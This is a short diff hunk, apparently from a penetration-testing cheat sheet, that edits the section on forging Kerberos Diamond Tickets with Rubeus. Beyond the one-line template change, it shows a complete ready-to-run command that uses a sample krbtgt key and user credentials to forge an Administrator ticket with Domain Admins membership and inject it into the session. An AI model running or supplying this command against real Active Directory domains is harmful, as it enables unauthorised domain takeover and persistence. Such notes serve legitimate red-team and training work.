@@ -27,7 +27,7 @@ You can use **Rubeus** to create a Diamond Ticket using the **krbtgt AES key** a
 
 
 ```powershell
-#  Rubeus.exe diamond /krbkey:<krbtgt_hash> /user:<normal_user> /password:<pass> /ticketuser:Administrator /domain:$DOMAIN /ptt
+#  Rubeus.exe diamond /krbkey:<krbtgt_hash> /user:<normal_user> /password:$PASS /ticketuser:Administrator /domain:$DOMAIN /ptt
 # - Logs in as normal user → Gets real TGT → Modifies it → Re-encrypts
 
 Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /user:devan /password:new_password123 /enctype:rc4 /ticketuser:Administrator /domain:$DOMAIN /dc:$DC_IP /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
